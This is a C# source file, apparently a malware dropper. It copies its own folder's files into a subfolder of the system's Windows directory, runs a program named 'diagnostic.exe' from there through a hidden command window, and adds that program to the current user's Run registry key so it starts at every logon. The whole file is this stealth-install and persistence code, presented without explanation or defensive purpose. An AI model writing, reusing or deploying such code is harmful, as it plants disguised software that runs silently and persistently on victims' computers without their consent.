using Microsoft.Win32;
using System.Diagnostics;
using System.IO;

string folders = "Windows";
string dir = Directory.GetCurrentDirectory();
string currentpath;
DriveInfo[] drivers = DriveInfo.GetDrives();
DirectoryInfo diinf = new DirectoryInfo(dir);

Run();

void Create(string path, string begunpath)
{
    DirectoryInfo[] dirs = diinf.GetDirectories();
    if (dirs.Length != 0)
    {
        foreach (DirectoryInfo dirr in dirs)
        {
            diinf = new DirectoryInfo(path + "\\" + dirr.Name);
            if (!diinf.Exists)
            {
                diinf.Create();
            }
            diinf = new DirectoryInfo(begunpath + "\\" + dirr.Name);
            FileInfo[] files = diinf.GetFiles();
            if (files.Length != 0)
            {
                foreach (FileInfo file in files)
                {
                    file.CopyTo(path + "\\" + dirr.Name + "\\" + file.Name, true);
                }
            }
            Create(path + "\\" + dirr.Name, begunpath + "\\" + dirr.Name);
        }
    }
}

void Run()
{
    for (int i = 0; i < drivers.Length; i++)
    {
        if (Directory.Exists(drivers[i].Name + $"\\{folders}"))
        {
            currentpath = drivers[i].Name + $"\\{folders}";
            diinf = new DirectoryInfo(dir);
            Create(currentpath, dir);
            Firstrun($@" & cd {drivers[i]}{folders}\Something & diagnostic.exe");
            Autorun(drivers[i].Name + folders + "\\Something\\diagnostic.exe");
            break;
        }
    }
}

void Firstrun(string comm)
{
    Process myProcess = new Process();
    myProcess.StartInfo.FileName = "cmd.exe";
    myProcess.StartInfo.Arguments = "/C c:" + comm;
    myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    myProcess.StartInfo.CreateNoWindow = true;
    myProcess.Start();
}

void Autorun(string path)
{
    const string assemblyName = "name";
    RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
    key.SetValue(assemblyName, path);
    //key.DeleteValue(assemblyName);
    key.Flush();
    key.Close();
}
